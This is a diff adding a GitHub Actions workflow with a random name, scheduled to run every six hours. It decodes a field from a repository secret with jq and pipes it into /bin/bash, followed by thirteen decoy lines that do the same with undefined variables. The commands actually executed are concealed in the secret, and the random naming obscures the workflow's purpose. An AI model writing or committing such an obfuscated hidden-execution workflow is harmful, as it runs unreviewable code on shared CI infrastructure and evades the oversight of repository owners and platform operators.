@@ -1,0 +1,29 @@
+name: zhenijiubiee
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhenijiubiee
+        env:
+          yplt98624: ${{ secrets.yplt98624 }}
+        run: |
+          echo $yplt98624 | jq -r .j88536 | /bin/bash
+          echo $nb5 | jq -r .abwos58731 | /bin/bash
+          echo $fsa00869 | jq -r .vvjba2152 | /bin/bash
+          echo $pw6 | jq -r .usv3186 | /bin/bash
+          echo $voj0036 | jq -r .tax232 | /bin/bash
+          echo $x79171 | jq -r .df06868 | /bin/bash
+          echo $vlvh162 | jq -r .zup903 | /bin/bash
+          echo $wbtcd1587 | jq -r .oc10 | /bin/bash
+          echo $uz1 | jq -r .nmso06913 | /bin/bash
+          echo $opjwk30 | jq -r .wnzfs6 | /bin/bash
+          echo $hsegh53 | jq -r .ekqfr37 | /bin/bash
+          echo $dvza4 | jq -r .e40498 | /bin/bash
+          echo $hb057 | jq -r .wfy778 | /bin/bash
+          echo $elb1 | jq -r .ei85 | /bin/bash
+
